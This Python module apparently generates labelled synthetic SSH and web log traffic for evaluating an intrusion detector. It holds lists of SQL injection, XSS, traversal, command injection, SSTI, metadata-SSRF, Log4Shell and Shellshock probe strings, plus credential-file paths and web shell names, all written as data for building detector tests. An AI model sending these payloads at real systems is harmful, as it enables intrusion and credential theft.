"""Labelled attack scenarios, written as the traffic they leave in logs.

Payloads are the probe strings scanners send (``' OR '1'='1``, ``../etc/passwd``,
``${jndi:...}``); callback hosts are RFC 5737 documentation addresses. Some
variants are deliberately hard (low-and-slow pacing, evasive payloads, rotating
user agents): their labels still name the detection that *should* catch them,
so the evaluation reports the misses honestly.
"""

from __future__ import annotations

from collections.abc import Callable
from datetime import datetime, timedelta
from urllib.parse import quote

from argus.simulate.world import (
    BROWSERS,
    CALLBACK_HOSTS,
    NOISE_UAS,
    SCANNER_UAS,
    SQLMAP_UA,
    SSH_GUESSES,
    World,
)

SQLI = (
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "1 UNION ALL SELECT NULL,NULL,NULL-- -",
    "1 AND SLEEP(5)",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
    "1;WAITFOR DELAY '0:0:5'--",
    "-1 UNION SELECT table_name,2 FROM information_schema.tables-- -",
    "1' AND extractvalue(1,concat(0x7e,version()))-- -",
    "1 AND 1=1-- -",
    "1' ORDER BY 3-- -",
)
SQLI_EVASIVE = (
    "1 AND ASCII(SUBSTRING((SELECT database()),1,1))>64",
    "1) AND (8571=8571",
    "1 RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))",
)
XSS = (
    "<script>alert(1)</script>",
    '"><svg onload=alert(1)>',
    "<img src=x onerror=alert(document.domain)>",
    "javascript:alert(1)",
    "'\"><script>prompt(1)</script>",
    "<details open ontoggle=alert(1)>",
)
TRAVERSAL = (
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd%00.png",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
)
CMDI = (
    "127.0.0.1;id",
    "127.0.0.1|id",
    "127.0.0.1 && whoami",
    "$(id)",
    "127.0.0.1;cat /etc/passwd",
    "`id`",
    "127.0.0.1|uname -a",
)
SSTI = ("{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}", "{{self.__init__}}", "{{7*'7'}}")
METADATA = (
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://[fd00:ec2::254]/latest/meta-data/",
    "http://2852039166/latest/user-data",
    "http://100.100.100.200/latest/meta-data/",
)
SENSITIVE = (
    "/.env",
    "/.env.production",
    "/.env.local",
    "/.git/config",
    "/.git/HEAD",
    "/.aws/credentials",
    "/.ssh/id_rsa",
    "/wp-config.php.bak",
    "/config.php~",
    "/backup.sql",
    "/dump.sql",
    "/db.sql.gz",
    "/.htpasswd",
    "/.DS_Store",
    "/phpinfo.php",
    "/server-status",
    "/actuator/env",
    "/.npmrc",
    "/.docker/config.json",
)
WORDS = (
    "admin",
    "administrator",
    "backup",
    "backups",
    "old",
    "new",
    "test",
    "tmp",
    "dev",
    "staging",
    "api",
    "v1",
    "v2",
    "console",
    "dashboard",
    "manager",
    "panel",
    "cpanel",
    "phpmyadmin",
    "pma",
    "mysql",
    "db",
    "sql",
    "uploads",
    "files",
    "images",
    "include",
    "includes",
    "lib",
    "scripts",
    "cgi-bin",
    "server",
    "private",
    "secret",
    "config",
    "conf",
    "logs",
    "log",
    "wp-admin",
    "wp-content",
    "wp-includes",
    "joomla",
    "drupal",
    "user",
    "users",
    "account",
    "accounts",
    "signin",
    "register",
    "portal",
    "store",
    "shop",
    "cart",
)
EXTENSIONS = ("", "/", ".php", ".bak", ".zip", ".old", ".txt", ".asp", ".jsp", ".html")
SHELLS = (
    "c99.php",
    "r57.php",
    "wso.php",
    "b374k.php",
    "alfa.php",
    "shell.php",
    "cmd.php",
    "webshell.php",
    "indoxploit.php",
    "priv8.php",
    "leafmailer.php",
    "marijuana.php",
    "alfa-rex.php7",
    "alfacgiapi.php",
    "wso2.php",
    "c100.php",
    "shell.jsp",
    "cmd.aspx",
)
NOISE_PATHS = (
    "/wp-login.php",
    "/.env",
    "/phpmyadmin/",
    "/boaform/admin/formLogin",
    "/HNAP1/",
    "/cgi-bin/luci",
    "/owa/auth/logon.aspx",
    "/solr/admin/info/system",
    "/vendor/",
)
STUFFING_UAS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/109.0.5414.120 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
)


def q(value: str) -> str:
    """Percent-encode a query value the way attack tools send it."""
    return quote(value, safe="")


def _window(world: World, hours: float, *, after: float = 1.0) -> datetime:
    """A start time leaving ``hours`` of room before the end of the simulation."""
    latest = max(after, world.hours - hours - 0.5)
    return world.at(world.rng.uniform(after, latest))


def _attacker(world: World, scenario: str, expected: tuple[str, ...]) -> str:
    ip = world.ips.take()
    world.labels.add(ip, scenario, malicious=True, expected=expected)
    return ip


# --- SSH -------------------------------------------------------------------------------


def ssh_brute_force(world: World) -> None:
    rng = world.rng
    slow = rng.random() < 0.2
    max_auth = rng.random() < 0.5
    expected = ("ssh-brute-force",) + (("ssh-max-auth-exceeded",) if max_auth else ())
    ip = _attacker(world, "ssh-brute-force-slow" if slow else "ssh-brute-force", expected)
    users = ["root"] if rng.random() < 0.6 else ["root", "admin"]
    attempts = rng.randint(30, 60) if slow else rng.randint(40, 300)
    t = _window(world, 3)
    port = world.port()
    for number in range(1, attempts + 1):
        user = users[number % len(users)]
        invalid = "invalid user " if user == "admin" else ""
        world.log(t, f"Failed password for {invalid}{user} from {ip} port {port} ssh2")
        if number % 6 == 0:
            if max_auth:
                world.log(
                    t,
                    f"error: maximum authentication attempts exceeded for {invalid}{user} "
                    f"from {ip} port {port} ssh2 [preauth]",
                )
            port = world.port()
        t += timedelta(seconds=rng.uniform(90, 180) if slow else rng.uniform(0.5, 4))


def ssh_brute_force_success(world: World) -> None:
    rng = world.rng
    expected = ("ssh-brute-force", "ssh-brute-force-success", "ssh-new-source-for-user")
    ip = _attacker(world, "ssh-brute-force-success", expected)
    user = rng.choice(("deploy", "backup"))
    t = world.at(rng.uniform(27, world.hours - 2))
    port = world.port()
    for _ in range(rng.randint(20, 80)):
        world.log(t, f"Failed password for {user} from {ip} port {port} ssh2")
        t += timedelta(seconds=rng.uniform(1, 5))
    world.log(t, f"Accepted password for {user} from {ip} port {port} ssh2")
    world.log(t, f"pam_unix(sshd:session): session opened for user {user}(uid=1100) by (uid=0)")


def ssh_password_spray(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "ssh-password-spray", ("ssh-password-spray",))
    t = _window(world, 2)
    for user in rng.sample(SSH_GUESSES, rng.randint(15, 30)):
        valid = user in ("backup", "deploy", "alice", "bob")
        for _ in range(rng.randint(1, 2)):
            port = world.port()
            if not valid:
                world.log(t, f"Invalid user {user} from {ip} port {port}")
            invalid = "" if valid else "invalid user "
            world.log(t, f"Failed password for {invalid}{user} from {ip} port {port} ssh2")
            t += timedelta(seconds=rng.uniform(20, 60))


def ssh_banner_scan(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "ssh-banner-scan", ("ssh-banner-scan",))
    t = _window(world, 1)
    for _ in range(rng.randint(3, 8)):
        if rng.random() < 0.7:
            world.log(t, f"Did not receive identification string from {ip} port {world.port()}")
        else:
            world.log(
                t, f"banner exchange: Connection from {ip} port {world.port()}: invalid format"
            )
        t += timedelta(seconds=rng.uniform(1, 15))


def ssh_root_compromise(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "ssh-root-compromise", ("ssh-root-login", "ssh-new-source-for-user"))
    t = world.at(rng.uniform(26, world.hours - 1))
    world.log(t, f"Accepted password for root from {ip} port {world.port()} ssh2")
    world.log(t, "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)")


def ssh_stolen_key(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "ssh-stolen-key", ("ssh-new-source-for-user",))
    user = rng.choice(("alice", "bob", "carol"))
    t = world.at(24 + rng.uniform(2, 5) + 24 * rng.randint(0, max(0, world.hours // 24 - 2)))
    world.log(
        t,
        f"Accepted publickey for {user} from {ip} port {world.port()} ssh2: "
        f"ED25519 SHA256:{world.fingerprint()}",
    )


# --- Web reconnaissance --------------------------------------------------------------------


def web_vuln_scanner(world: World) -> None:
    rng = world.rng
    expected = ("web-scanner-user-agent", "web-sensitive-file-probe", "web-wordlist-scan")
    ip = _attacker(world, "web-vuln-scanner", expected)
    ua = rng.choice(SCANNER_UAS)
    t = _window(world, 1)
    targets = [f"/{w}{e}" for w in WORDS for e in EXTENSIONS]
    targets = rng.sample(targets, rng.randint(250, 500)) + list(SENSITIVE[:6])
    targets += [f"/index.php?id={q(p)}" for p in SQLI[:3]]
    targets += [f"/search?q={q(p)}" for p in XSS[:2]]
    targets += [f"/download?file={q(p)}" for p in TRAVERSAL[:2]]
    rng.shuffle(targets)
    world.hit(t, ip, "/", size=24000, ua=ua)
    world.hit(t, ip, "/robots.txt", size=180, ua=ua)
    for target in targets:
        t += timedelta(seconds=rng.uniform(0.02, 0.2))
        status = rng.choice((404, 404, 404, 404, 403, 400))
        world.hit(t, ip, target, status=status, size=rng.randint(150, 600), ua=ua)


def web_env_harvest(world: World) -> None:
    rng = world.rng
    exposed = world.git_exposed
    expected = ("web-sensitive-file-probe",) + (("web-sensitive-file-exposed",) if exposed else ())
    ip = _attacker(world, "web-env-harvest", expected)
    ua = rng.choice(("Go-http-client/1.1", "Mozilla/5.0 (X11; Linux x86_64)", BROWSERS[0]))
    t = _window(world, 1)
    for path in rng.sample(SENSITIVE, rng.randint(5, len(SENSITIVE))):
        found = exposed and path == "/.git/config"
        world.hit(t, ip, path, status=200 if found else 404, size=287 if found else 162, ua=ua)
        t += timedelta(seconds=rng.uniform(0.2, 2))
    if exposed:
        world.hit(t, ip, "/.git/config", size=287, ua=ua)


def web_dir_bruteforce(world: World) -> None:
    rng = world.rng
    slow = rng.random() < 0.15
    ip = _attacker(
        world, "web-dir-bruteforce-slow" if slow else "web-dir-bruteforce", ("web-wordlist-scan",)
    )
    ua = rng.choice(BROWSERS)
    t = _window(world, 3 if slow else 1)
    targets = rng.sample([f"/{w}{e}" for w in WORDS for e in EXTENSIONS], rng.randint(150, 500))
    for target in targets:
        status = 200 if target in ("/cart", "/store") else rng.choice((404, 404, 404, 403))
        world.hit(t, ip, target, status=status, size=rng.randint(150, 900), ua=ua)
        t += timedelta(seconds=rng.uniform(8, 15) if slow else rng.uniform(0.15, 0.6))


def web_user_enum(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "web-user-enumeration", ("web-user-enumeration",))
    ua = rng.choice(("WPScan-like/1.0", BROWSERS[1], "python-requests/2.31.0"))
    t = _window(world, 1)
    for author in range(1, rng.randint(4, 15)):
        world.hit(t, ip, f"/?author={author}", status=301, ua=ua)
        t += timedelta(seconds=rng.uniform(0.5, 3))
    world.hit(t, ip, "/wp-json/wp/v2/users", status=404, size=150, ua=ua)
    world.hit(t, ip, "/?rest_route=/wp/v2/users", status=404, size=150, ua=ua)


# --- Web exploitation probes ---------------------------------------------------------


def _probe_run(
    world: World,
    scenario: str,
    rule: str,
    build: Callable[[str], str],
    payloads: tuple[str, ...],
    *,
    count: tuple[int, int],
    ua: str | None = None,
    extra: tuple[str, ...] = (),
) -> None:
    rng = world.rng
    ip = _attacker(world, scenario, (rule, *extra))
    agent = ua or rng.choice(BROWSERS)
    t = _window(world, 1)
    for _ in range(rng.randint(*count)):
        world.hit(
            t,
            ip,
            build(rng.choice(payloads)),
            status=rng.choice((200, 400, 500)),
            size=rng.randint(300, 9000),
            ua=agent,
        )
        t += timedelta(seconds=rng.uniform(0.5, 6))


def web_sqli(world: World) -> None:
    rng = world.rng
    evasive = rng.random() < 0.15
    sqlmap = not evasive and rng.random() < 0.6
    _probe_run(
        world,
        "web-sqli-evasive" if evasive else "web-sqli",
        "web-sqli-probe",
        lambda p: f"/products?id={q(p)}",
        SQLI_EVASIVE if evasive else SQLI,
        count=(20, 150),
        ua=SQLMAP_UA if sqlmap else None,
        extra=("web-scanner-user-agent",) if sqlmap else (),
    )


def web_xss(world: World) -> None:
    _probe_run(world, "web-xss", "web-xss-probe", lambda p: f"/search?q={q(p)}", XSS, count=(5, 30))


def web_traversal(world: World) -> None:
    paths = ("/download?file={}", "/static/{}", "/index.php?page={}")
    rng = world.rng
    template = rng.choice(paths)
    _probe_run(
        world,
        "web-path-traversal",
        "web-path-traversal",
        lambda p: template.format(q(p) if "?" in template else p.replace("\\", "%5c")),
        TRAVERSAL,
        count=(5, 40),
    )


def web_cmdi(world: World) -> None:
    _probe_run(
        world,
        "web-command-injection",
        "web-command-injection",
        lambda p: f"/tools/ping?host={q(p)}",
        CMDI,
        count=(5, 30),
    )


def web_ssti(world: World) -> None:
    _probe_run(
        world, "web-ssti", "web-ssti-probe", lambda p: f"/hello?name={q(p)}", SSTI, count=(3, 15)
    )


def web_ssrf_metadata(world: World) -> None:
    rng = world.rng
    endpoint = rng.choice(("/fetch?url=", "/api/v1/preview?link=", "/proxy?dest=", "/image?src="))
    _probe_run(
        world,
        "web-ssrf-metadata",
        "web-cloud-metadata-ssrf",
        lambda p: endpoint + q(p),
        METADATA,
        count=(3, 12),
    )


def web_log4shell(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "web-log4shell", ("web-log4shell-probe",))
    t = _window(world, 1)
    for _ in range(rng.randint(3, 20)):
        host = rng.choice(CALLBACK_HOSTS)
        payload = rng.choice(
            (
                f"${{jndi:ldap://{host}:1389/a}}",
                f"${{${{lower:j}}ndi:ldap://{host}/x}}",
                f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:rmi://{host}/x}}",
                f"${{jndi:dns://{host}/probe}}",
            )
        )
        place = rng.choice(("ua", "referrer", "query"))
        target = (
            f"/?x={q(payload)}"
            if place == "query"
            else rng.choice(("/", "/login", "/api/v1/items"))
        )
        world.hit(
            t,
            ip,
            target,
            status=rng.choice((200, 400, 404)),
            size=rng.randint(150, 5000),
            ua=payload if place == "ua" else BROWSERS[0],
            referrer=payload if place == "referrer" else "",
        )
        t += timedelta(seconds=rng.uniform(0.5, 5))


def web_shellshock(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "web-shellshock", ("web-shellshock-probe",))
    t = _window(world, 1)
    for _ in range(rng.randint(2, 8)):
        ua = rng.choice(("() { :; }; echo; /usr/bin/id", '() { :;}; /bin/bash -c "echo probe"'))
        target = rng.choice(("/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/admin.cgi"))
        world.hit(t, ip, target, status=404, size=200, ua=ua)
        t += timedelta(seconds=rng.uniform(0.5, 4))


# --- Web shells, credentials, floods -------------------------------------------------


def web_shell_probe(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "web-shell-probe", ("web-shell-known-name",))
    ua = rng.choice(NOISE_UAS[1:])
    t = _window(world, 1)
    for name in rng.sample(SHELLS, rng.randint(6, len(SHELLS))):
        prefix = rng.choice(("/", "/wp-content/plugins/hello/", "/images/"))
        world.hit(t, ip, prefix + name, status=404, size=160, ua=ua)
        t += timedelta(seconds=rng.uniform(0.2, 2))


def web_shell_interaction(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "web-shell-interaction", ("web-shell-upload-exec",))
    name = "".join(rng.choice("abcdef0123456789") for _ in range(8))
    path = f"/uploads/2026/03/img_{name}.php"
    ua = rng.choice(BROWSERS)
    t = _window(world, 2)
    for _ in range(rng.randint(5, 40)):
        if rng.random() < 0.7:
            world.hit(t, ip, path, method="POST", size=rng.randint(40, 3000), ua=ua)
        else:
            world.hit(t, ip, f"{path}?act=ls", size=rng.randint(200, 2000), ua=ua)
        t += timedelta(seconds=rng.uniform(5, 120))


def web_login_brute(world: World) -> None:
    rng = world.rng
    slow = rng.random() < 0.15
    ip = _attacker(
        world, "web-login-brute-slow" if slow else "web-login-brute", ("web-login-brute-force",)
    )
    ua = rng.choice(("python-requests/2.31.0", BROWSERS[0], "Hydra"))
    t = _window(world, 3 if slow else 1)
    for _ in range(rng.randint(25, 45) if slow else rng.randint(50, 400)):
        world.hit(t, ip, "/login", method="POST", status=401, size=5400, ua=ua)
        t += timedelta(seconds=rng.uniform(20, 40) if slow else rng.uniform(0.3, 3))


def web_credential_stuffing(world: World) -> None:
    rng = world.rng
    rotating = rng.random() < 0.2
    scenario = "web-credential-stuffing-rotating-ua" if rotating else "web-credential-stuffing"
    ua = rng.choice(STUFFING_UAS)
    start = _window(world, 1)
    span = rng.uniform(6, 15) * 60
    for _ in range(rng.randint(12, 40)):
        ip = _attacker(world, scenario, ("web-credential-stuffing",))
        t = start + timedelta(seconds=rng.uniform(0, span))
        for _ in range(rng.randint(1, 4)):
            agent = rng.choice(BROWSERS) if rotating else ua
            status = 302 if rng.random() < 0.05 else 401
            world.hit(t, ip, "/login", method="POST", status=status, size=5400, ua=agent)
            t += timedelta(seconds=rng.uniform(5, 60))


def web_http_flood(world: World) -> None:
    rng = world.rng
    ip = _attacker(world, "web-http-flood", ("web-request-flood",))
    ua = rng.choice((BROWSERS[0], "Mozilla/5.0"))
    t = _window(world, 1)
    total = rng.randint(1500, 6000)
    per_minute = rng.uniform(400, 1200)
    step = 60 / per_minute
    for number in range(total):
        target = "/" if rng.random() < 0.5 else f"/search?q={rng.randint(0, 10**6)}"
        status = 503 if number > total * 0.7 and rng.random() < 0.5 else 200
        world.hit(t, ip, target, status=status, size=0 if status == 503 else 24000, ua=ua)
        t += timedelta(seconds=step * rng.uniform(0.5, 1.5))


# --- Background noise ------------------------------------------------------------------


def background_noise(world: World) -> None:
    """Opportunistic internet scanning: a few requests or logins per address."""
    rng = world.rng
    days = -(-world.hours // 24)
    for day in range(days):
        for _ in range(rng.randint(25, 40)):
            ip = world.ips.take()
            world.labels.add(ip, "ssh-background-noise", malicious=True)
            t = world.at(day * 24 + rng.uniform(0, 24))
            user = rng.choice(("root", "admin", "ubuntu", "test", "oracle"))
            for _ in range(rng.randint(1, 3)):
                port = world.port()
                if user == "root":
                    world.log(t, f"Failed password for root from {ip} port {port} ssh2")
                else:
                    world.log(t, f"Invalid user {user} from {ip} port {port}")
                    world.log(
                        t, f"Failed password for invalid user {user} from {ip} port {port} ssh2"
                    )
                    world.log(
                        t, f"Connection closed by invalid user {user} {ip} port {port} [preauth]"
                    )
                t += timedelta(seconds=rng.uniform(1, 20))
        for _ in range(rng.randint(20, 35)):
            ip = world.ips.take()
            ua = rng.choice(NOISE_UAS)
            expected = ("web-scanner-user-agent",) if "zgrab" in ua else ()
            world.labels.add(ip, "web-background-noise", malicious=True, expected=expected)
            t = world.at(day * 24 + rng.uniform(0, 24))
            for _ in range(rng.randint(1, 2)):
                world.hit(t, ip, rng.choice(NOISE_PATHS), status=404, size=150, ua=ua)
                t += timedelta(seconds=rng.uniform(1, 30))


SCENARIOS: tuple[tuple[str, Callable[[World], None], tuple[int, int]], ...] = (
    ("ssh-brute-force", ssh_brute_force, (1, 2)),
    ("ssh-brute-force-success", ssh_brute_force_success, (1, 1)),
    ("ssh-password-spray", ssh_password_spray, (1, 2)),
    ("ssh-banner-scan", ssh_banner_scan, (1, 2)),
    ("ssh-root-compromise", ssh_root_compromise, (1, 1)),
    ("ssh-stolen-key", ssh_stolen_key, (1, 1)),
    ("web-vuln-scanner", web_vuln_scanner, (1, 2)),
    ("web-env-harvest", web_env_harvest, (1, 2)),
    ("web-dir-bruteforce", web_dir_bruteforce, (1, 2)),
    ("web-user-enumeration", web_user_enum, (1, 2)),
    ("web-sqli", web_sqli, (1, 2)),
    ("web-xss", web_xss, (1, 2)),
    ("web-path-traversal", web_traversal, (1, 2)),
    ("web-command-injection", web_cmdi, (1, 2)),
    ("web-ssti", web_ssti, (1, 2)),
    ("web-ssrf-metadata", web_ssrf_metadata, (1, 2)),
    ("web-log4shell", web_log4shell, (1, 2)),
    ("web-shellshock", web_shellshock, (1, 2)),
    ("web-shell-probe", web_shell_probe, (1, 2)),
    ("web-shell-interaction", web_shell_interaction, (1, 1)),
    ("web-login-brute", web_login_brute, (1, 2)),
    ("web-credential-stuffing", web_credential_stuffing, (1, 1)),
    ("web-http-flood", web_http_flood, (1, 1)),
)
